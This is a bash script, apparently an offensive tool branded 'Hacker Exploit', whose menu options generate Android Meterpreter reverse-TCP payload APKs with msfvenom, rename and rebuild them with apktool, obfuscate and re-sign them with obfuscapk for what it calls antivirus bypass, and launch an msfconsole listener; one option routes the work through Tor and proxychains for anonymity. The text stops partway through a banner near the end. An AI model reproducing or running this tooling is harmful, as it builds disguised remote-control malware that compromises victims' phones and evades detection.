#!/bin/bash
clear
LPARTH=`pwd`

RED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RESTORE=$'\e[0m'
#echo -e "\n${YELLOW}                        Version: ${BLUE}1.0 ${YELLOW}Author: ${BLUE}graylagx2${RESTORE}\n"

function delay()
{
    sleep 0.80;
}

#
# Description : print out executing progress
# 
CURRENT_PROGRESS=0
function progress()
{
    PARAM_PROGRESS=$1;
    PARAM_PHASE=$2;

    if [ $CURRENT_PROGRESS -le 0 -a $PARAM_PROGRESS -ge 0 ]  ; then echo -ne "[..........................] (0%)  $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 5 -a $PARAM_PROGRESS -ge 5 ]  ; then echo -ne "[#.........................] (5%)  $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 10 -a $PARAM_PROGRESS -ge 10 ]; then echo -ne "[##........................] (10%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 15 -a $PARAM_PROGRESS -ge 15 ]; then echo -ne "[###.......................] (15%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 20 -a $PARAM_PROGRESS -ge 20 ]; then echo -ne "[####......................] (20%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 25 -a $PARAM_PROGRESS -ge 25 ]; then echo -ne "[#####.....................] (25%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 30 -a $PARAM_PROGRESS -ge 30 ]; then echo -ne "[######....................] (30%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 35 -a $PARAM_PROGRESS -ge 35 ]; then echo -ne "[#######...................] (35%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 40 -a $PARAM_PROGRESS -ge 40 ]; then echo -ne "[########..................] (40%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 45 -a $PARAM_PROGRESS -ge 45 ]; then echo -ne "[#########.................] (45%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 50 -a $PARAM_PROGRESS -ge 50 ]; then echo -ne "[##########................] (50%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 55 -a $PARAM_PROGRESS -ge 55 ]; then echo -ne "[###########...............] (55%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 60 -a $PARAM_PROGRESS -ge 60 ]; then echo -ne "[############..............] (60%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 65 -a $PARAM_PROGRESS -ge 65 ]; then echo -ne "[#############.............] (65%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 70 -a $PARAM_PROGRESS -ge 70 ]; then echo -ne "[###############...........] (70%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 75 -a $PARAM_PROGRESS -ge 75 ]; then echo -ne "[#################.........] (75%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 80 -a $PARAM_PROGRESS -ge 80 ]; then echo -ne "[####################......] (80%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 85 -a $PARAM_PROGRESS -ge 85 ]; then echo -ne "[#######################...] (85%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 90 -a $PARAM_PROGRESS -ge 90 ]; then echo -ne "[##########################] (100%) $PARAM_PHASE \r" ; delay; fi;
    if [ $CURRENT_PROGRESS -le 100 -a $PARAM_PROGRESS -ge 100 ];then echo -ne 'Done!                                            \n' ; delay; fi;

    CURRENT_PROGRESS=$PARAM_PROGRESS;

}




#logo or name




sleep 1.1;
		
			clear
	

			echo "${GREEN}"
echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${YELLOW}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			
			

			echo "${RESTORE}"
			echo "=============================================================================================================="
			myip=
			while IFS=$': \t' read -a line ;do
			    [ -z "${line%inet}" ] && ip=${line[${#line[1]}>4?1:2]} &&
				[ "${ip#127.0.0.1}" ] && myip=$ip
			  done< <(LANG=C /sbin/ifconfig)
			echo			
			echo "your LHOST or local ip   ${GREEN}' $myip' ${RESTORE}"
			#echo "your LPORT or local port was set ${GREEN}'$PORT'${RESTORE} "
			#echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE} "
			
			echo "=============================================================================================================="

			echo "${RESTORE}"







	echo "Select your Favorite Option . "



	select planet in  "Only-Encryption" "build-Encryp-name-change" "build-and-exploit-Anonymously" "inject-payload-into-apk" "Back"

	do
		#OPTIONS = 1 ================1===============1======================1================1=============
		if [ "$planet" == Only-Encryption ]

		    then

			clear
	

			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${YELLOW}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			
			

			echo "${RESTORE}"
		




echo "${GREEN}your Local ip info.. "
echo "${RESTORE}"
ifconfig

echo "${RESTORE}"
echo "=============================================================================================================="
echo "${RESTORE}"

			myip=
			while IFS=$': \t' read -a line ;do
			    [ -z "${line%inet}" ] && ip=${line[${#line[1]}>4?1:2]} &&
				[ "${ip#127.0.0.1}" ] && myip=$ip
			  done< <(LANG=C /sbin/ifconfig)
			echo			
			echo "your LHOST or local ip   ${GREEN}' $myip' ${RESTORE}"
			#echo "your LPORT or local port was set ${GREEN}'$PORT'${RESTORE} "
			#echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE} "
			
			echo "=============================================================================================================="

			echo "${RESTORE}"

#data input
echo " please input your current interface ip "
read -p ' HE :~' IP

echo " please input your Choice Port number "
read -p ' HE :~ ' PORT



echo " please input your choice App name"
read -p ' HE :~ ' APPNAME 

echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""
			echo "The task is in progress, please wait a few minute"

			#Do some tasks
			progress 12 Initialize

			    echo "${YELLOW}[*] Remove Case Output system. ${GREEN}DONE"



			rm -rf $LPARTH/WH-output
			rm -rf $LPARTH/obfuscation_working_dir
			progress 10 "Processing..."

			mkdir $LPARTH/WH-output


			echo "${YELLOW}[*] Create Output system > complete ${GREEN}DONE"



			progress 20 "Processing..."

			#main-action ==================================================01===run

			msfvenom -p android/meterpreter/reverse_tcp Lhost=$IP Lport=$PORT R > $APPNAME.apk
			#main-action ==================================================01===done
			echo "${YELLOW}[*] Create Payload > complete. ${GREEN}DONE"

			progress 30 "Processing..."

			#main-action ==================================================02===run
			python3 -m obfuscapk.cli -o RandomManifest -o Rebuild -o NewSignature -o NewAlignment $APPNAME.apk
			#main-action ==================================================01===done


			echo "${YELLOW}[*] Decompiled your Android ${BLUE}$APPNAME  Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			echo "${YELLOW}[*] Bleached your ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			
			echo "${YELLOW}[*] Aligned for your ${BLUE}$APPNAME > Complete . ${GREEN}DONE "
			sleep 0.90;
			
			progress 45 "Processing..."
			echo "[*]Payload create and Encryption > Complete . ${GREEN}DONE "

			name="_obfuscated"

			sleep 0.90;
			echo "${YELLOW}[*] Generated key for ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			echo "${YELLOW}[*] Signined for your ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;

			progress 50 "Processing..."
			#rm -rf $LPARTH/$APPNAME.apk
			sleep 0.90;
			progress 55 "Processing..."
			mv $LPARTH/obfuscation_working_dir/$APPNAME$name.apk $LPARTH/WH-output/$APPNAME.apk
			sleep 0.90;
			progress 70 "Processing..."
			echo "${YELLOW}[*] Rebuilt Android Application as ${BLUE}$APPNAME > Complete . ${GREEN}DONE "
			sleep 0.90;














			#OUTPUT 

			echo "${YELLOW}[*] Remove Msfconsole case ${BLUE}RC file > Complete . ${GREEN}DONE "
			rm -rf $LPARTH/temp
			sleep 0.90;

			progress 75 "Processing..."



			mkdir $LPARTH/temp

			progress 85 "Processing..."

			touch $LPARTH/temp/$APPNAME.rc 
			echo "${YELLOW}[*] Create Msfconsole  ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 90 "Processing..."
			#exquate ip & port & handeler & payload 

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST $IP " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT $PORT " >> $LPARTH/temp/$APPNAME.rc

			echo "${YELLOW}[*] Input data for Msfconsole in ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 100 "Processing..."
			progress 100 "Processing... done"
			echo

			sleep 4.1;

			clear

			echo "${YELLOW}"
			echo " WELCOME TO The "
				
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${RESTORE}"
			echo "=============================================================================================================="
			echo "${RESTORE}"
			echo "your LHOST or local ip was set ${GREEN}'$IP' "
			echo "${RESTORE}"
			echo "your LPORT or local port was set ${GREEN}'$PORT' "
			echo "${RESTORE}"
			echo "your output app name was set ${GREEN}'$APPNAME' "
			echo "${RESTORE}"
			echo " opening msfconsole  "
			echo "=============================================================================================================="
			echo "${RESTORE}"
			rm -rf $LPARTH/$APPNAME.apk

			msfconsole -r $LPARTH/temp/$APPNAME.rc

			
			bash $LPARTH/actions/android-AVB..sh















		#OPTIONS =====2============2=====================2===================2=================2============2==========
		elif [ "$planet" == build-Encryp-name-change ]
		then
		     #msfvenom -x Fb.apk -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/$APPNAME.apk


			clear
	

			echo "${GREEN}"


			echo " WELCOME TO The "
			echo "${YELLOW}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			
			

			echo "${RESTORE}"
			echo "=============================================================================================================="
		
echo "${GREEN}your Local ip info.. "
echo "${RESTORE}"
ifconfig

echo "${RESTORE}"
echo "=============================================================================================================="
echo "${RESTORE}"
			echo "${RESTORE}"
			echo "=============================================================================================================="
			echo "${RESTORE}"
			myip=
			while IFS=$': \t' read -a line ;do
			    [ -z "${line%inet}" ] && ip=${line[${#line[1]}>4?1:2]} &&
				[ "${ip#127.0.0.1}" ] && myip=$ip
			  done< <(LANG=C /sbin/ifconfig)
			echo			
			echo "your LHOST or local ip   ${GREEN}' $myip' ${RESTORE}"
			#echo "your LPORT or local port was set ${GREEN}'$PORT'${RESTORE} "
			#echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE} "
			
			echo "=============================================================================================================="

			echo ""

#data input
echo " please input your current interface ip "
read -p ' HE :~' IP

echo " please input your Choice Port number "
read -p ' HE :~ ' PORT



echo " please input your choice App name"
read -p ' HE :~ ' APPNAME 


		
echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""
	
#=====================================================START==============OPTION-2==================================================================
			echo "The task is in progress, please wait a few minute"

			#Do some tasks
			progress 18 Initialize
			rm -rf $LPARTH/temp
			rm -rf $LPARTH/WH-output
			rm -rf $LPARTH/obfuscation_working_dir

			    echo "${YELLOW}[*] Remove Case Output system. ${GREEN}DONE"



			
			progress 05 "Processing..."

			mkdir $LPARTH/WH-output
			mkdir $LPARTH/temp

			echo "${YELLOW}[*] Create Output system > complete ${GREEN}DONE"



			progress 10 "Processing..."

			#main-action ==================================================01===run	
			#msfvenom -x Fb.apk -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/$APPNAME.apk	
			sudo msfvenom -p android/meterpreter/reverse_tcp Lhost=$IP Lport=$PORT R > $APPNAME.apk
			#main-action ==================================================01===done
			#==========
			echo "${YELLOW}[*] Create Payload > complete. ${GREEN}DONE"

			progress 20 "Processing..."

			#ACTION NAME CHANGE START ===============================
			
			
				
touch $LPARTH/temp/$APPNAME.xml
sleep 2.3;

#==========
echo "${YELLOW}[*] Decompile your Android ${BLUE}$APPNAME  Application > Complete . ${GREEN} START "

echo "${YELLOW}"
sudo apktool d $APPNAME.apk
sleep 0.90;
echo "${YELLOW}[*] Decompiled your Android ${BLUE}$APPNAME  Application > Complete . ${GREEN}DONE "

progress 25 "Processing..."











#echo " <?xml version="1.0" encoding="utf-8"?>" >> $LPARTH/temp/$APPNAME.xml 


function greeting() {

str="<?xml $name"
echo $str

}

name3='"1.0"'
name4='"utf-8"'
val=$(greeting)
echo "$val version=$name3 encoding=$name4 ?>" >> $LPARTH/temp/$APPNAME.xml


sleep 1.3;
echo " <resources>" >> $LPARTH/temp/$APPNAME.xml 
sleep 1.3;

#echo ' <string name="app_name">$APPNAME</string>' >> $LPARTH/temp/$APPNAME.xml


function greeting() {

str="<string  $name"
echo $str

}


name1='"app_name"'

val=$(greeting)
echo "$val name=$name1>$APPNAME</string> " >> $LPARTH/temp/$APPNAME.xml


sleep 1.3;
echo " </resources>" >> $LPARTH/temp/$APPNAME.xml 
sleep 2.3;

rm -rf $LPARTH/$APPNAME/res/values/strings.xml
sleep 1.5;

cp $LPARTH/temp/$APPNAME.xml $LPARTH/$APPNAME/res/values/strings.xml

sleep 1.5;
#=======
echo "${YELLOW}[*] Your Android ${BLUE}$APPNAME  Application Name has been changed > Complete . ${GREEN}DONE "
sleep 0.90;
progress 30 "Processing..."



rm -rf $LPARTH/$APPNAME.apk
sleep 1.5;


#==============
echo "${YELLOW}[*] Remove your temporary Android ${BLUE}$APPNAME  Application > Complete . ${GREEN}DONE "
sleep 0.90;
progress 32 "Processing..."

echo "${YELLOW}[*] Building your Android ${BLUE}$APPNAME  Application > Processing . ${GREEN}START "
sleep 0.90;
sudo apktool b $APPNAME -o $LPARTH/$APPNAME.apk
#=========
echo "${YELLOW}[*] Building for your Android ${BLUE}( $APPNAME )  Application > Complete . ${GREEN}DONE "
sleep 0.90;
progress 47 "Processing..."















echo "${YELLOW}[*] Encryption and AV bypass your Android ${BLUE}$APPNAME  Application > Processing . ${GREEN}START"
			sleep 0.90;


			#ACTION NAME CHANGE COMPLETE ===============================
			
			#main-action ==================================================02===run
			python3 -m obfuscapk.cli -o RandomManifest -o Rebuild -o NewSignature -o NewAlignment $APPNAME.apk
			#main-action ==================================================01===done

			echo "${YELLOW}[*] Decompiled your Android ${BLUE}$APPNAME  Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 56 "Processing..."
			echo "${YELLOW}[*] ADD RandomManifest your Android ${BLUE}$APPNAME  Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 68 "Processing..."
			echo "${YELLOW}[*] ADD Bleached your ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 74 "Processing..."
			echo "${YELLOW}[*] ADD NewSignature for your ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			
			progress 79 "Processing..."
			echo "[*] ADD Payload NewAlignment > Complete . ${GREEN}DONE "

			name8="_obfuscated"

			sleep 0.90;
			echo "${YELLOW}[*] ADD Generated key for ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 86 "Processing..."
			echo "${YELLOW}[*] Ckecking for your ${BLUE}$APPNAME Application error > Complete . ${GREEN}DONE "
			sleep 0.90;

			progress 90 "Processing..."
			
			sleep 0.90;
			progress 92 "Processing..."
			mv $LPARTH/obfuscation_working_dir/$APPNAME$name8.apk $LPARTH/WH-output/$APPNAME.apk
			sleep 0.90;
			progress 96 "Processing..."
			echo "${YELLOW}[*] Rebuilt Android Application as ${BLUE}$APPNAME > Complete . ${GREEN}DONE "
			sleep 0.90;














			#OUTPUT 

			echo "${YELLOW}[*] Remove Msfconsole case ${BLUE}RC file > Complete . ${GREEN}DONE "
			
			sleep 0.90;

			#==================

			progress 97 "Processing..."

			touch $LPARTH/temp/$APPNAME.rc 
			echo "${YELLOW}[*] Create Msfconsole  ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 98 "Processing..."
			#exquate ip & port & handeler & payload 

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST $IP " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT $PORT " >> $LPARTH/temp/$APPNAME.rc

			echo "${YELLOW}[*] Input data for Msfconsole in ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 100 "Processing..."
			progress 100 "Processing... done"
			echo
			echo "[* ] ####################100%#################### > Complete . ${GREEN}DONE "
			sleep 4.1;

			clear

			echo "${YELLOW}"
			echo " WELCOME TO The "
				
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${RESTORE}"
			echo "=============================================================================================================="
			echo "${RESTORE}"
			echo "your LHOST or local ip was set ${GREEN}'$IP' "
			echo "${RESTORE}"
			echo "your LPORT or local port was set ${GREEN}'$PORT' "
			echo "${RESTORE}"
			echo "your output app name was set ${GREEN}'$APPNAME' "
			echo "${RESTORE}"
			echo " opening msfconsole  "
			echo "=============================================================================================================="
			echo "${RESTORE}"
			rm -rf $LPARTH/$APPNAME.apk
			rm -rf $LPARTH/$APPNAME
			sleep 1.5;
			msfconsole -r $LPARTH/temp/$APPNAME.rc


			 bash $LPARTH/actions/android-AVB..sh






























































































#=================================================================================================================================================






		#OPTIONS == 3 ========== 3 ================== 3 ====================== 3======================3 =================

		elif [ "$planet" == build-and-exploit-Anonymously ]
		then

			clear
	

			echo "${GREEN}"
echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${YELLOW}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			
			

			echo "${RESTORE}"
			echo "=============================================================================================================="
		
			echo "${RESTORE}"

			echo "${GREEN}your Local ip info.. "
			echo "${RESTORE}"
			ifconfig

			echo "${RESTORE}"
			echo "=============================================================================================================="
			echo "${RESTORE}"
			myip=
			while IFS=$': \t' read -a line ;do
			    [ -z "${line%inet}" ] && ip=${line[${#line[1]}>4?1:2]} &&
				[ "${ip#127.0.0.1}" ] && myip=$ip
			  done< <(LANG=C /sbin/ifconfig)
			echo			
			echo "your LHOST or local ip   ${GREEN}' $myip' ${RESTORE}"
			#echo "your LPORT or local port was set ${GREEN}'$PORT'${RESTORE} "
			#echo "your output app name was set ${GREEN}'$APPNAME'${RESTORE} "
			
			echo "=============================================================================================================="

			echo ""
#data input
echo " please input your current interface ip "
read -p ' HE :~' IP

echo " please input your Choice Port number "
read -p ' HE :~ ' PORT



echo " please input your choice App name"
read -p ' HE :~ ' APPNAME 
		
echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
	
 #proxychains msfvenom -x wifi.apk -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -o $LPARTH/$APPNAME.apk
			service tor stop
			sleep 3.1;
		       	service tor start
			
			echo "The task is in progress, please wait a few minute"
			echo "${YELLOW}[*] Tor service Start. ${GREEN}DONE"
			#Do some tasks
			progress 7 Initialize

			    echo "${YELLOW}[*] Remove Case Output system. ${GREEN}DONE"



			rm -rf $LPARTH/WH-output
			rm -rf $LPARTH/obfuscation_working_dir
			progress 10 "Processing..."

			mkdir $LPARTH/WH-output


			echo "${YELLOW}[*] Create Output system > complete ${GREEN}DONE"



			progress 20 "Processing..."

			#main-action ==================================================01===run

			proxychains msfvenom -p android/meterpreter/reverse_tcp Lhost=$IP Lport=$PORT R > $APPNAME.apk
			#main-action ==================================================01===done
			echo "${YELLOW}[*] Create Payload > complete. ${GREEN}DONE"

			progress 30 "Processing..."

			#main-action ==================================================02===run
			proxychains python3 -m obfuscapk.cli -o RandomManifest -o Rebuild -o NewSignature -o NewAlignment $APPNAME.apk
			#main-action ==================================================01===done


			echo "${YELLOW}[*] Decompiled your Android ${BLUE}$APPNAME  Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			echo "${YELLOW}[*] Bleached your ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			
			echo "${YELLOW}[*] Aligned for your ${BLUE}$APPNAME > Complete . ${GREEN}DONE "
			sleep 0.90;
			
			progress 45 "Processing..."
			echo "[*]Payload create and Encryption > Complete . ${GREEN}DONE "

			name="_obfuscated"

			sleep 0.90;
			echo "${YELLOW}[*] Generated key for ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;
			echo "${YELLOW}[*] Signined for your ${BLUE}$APPNAME Application > Complete . ${GREEN}DONE "
			sleep 0.90;

			progress 50 "Processing..."
			#rm -rf $LPARTH/$APPNAME.apk
			sleep 0.90;
			progress 55 "Processing..."
			mv $LPARTH/obfuscation_working_dir/$APPNAME$name.apk $LPARTH/WH-output/$APPNAME.apk
			sleep 0.90;
			progress 70 "Processing..."
			echo "${YELLOW}[*] Rebuilt Android Application as ${BLUE}$APPNAME > Complete . ${GREEN}DONE "
			sleep 0.90;














			#OUTPUT 

			echo "${YELLOW}[*] Remove Msfconsole case ${BLUE}RC file > Complete . ${GREEN}DONE "
			rm -rf $LPARTH/temp
			sleep 0.90;

			progress 75 "Processing..."



			mkdir $LPARTH/temp

			progress 85 "Processing..."

			touch $LPARTH/temp/$APPNAME.rc 
			echo "${YELLOW}[*] Create Msfconsole  ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 90 "Processing..."
			#exquate ip & port & handeler & payload 

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD android/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST $IP " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT $PORT " >> $LPARTH/temp/$APPNAME.rc

			echo "${YELLOW}[*] Input data for Msfconsole in ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 100 "Processing..."
			progress 100 "Processing... done"
			echo

			sleep 4.1;

			clear

			echo "${YELLOW}"
			echo " WELCOME TO The "
				
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
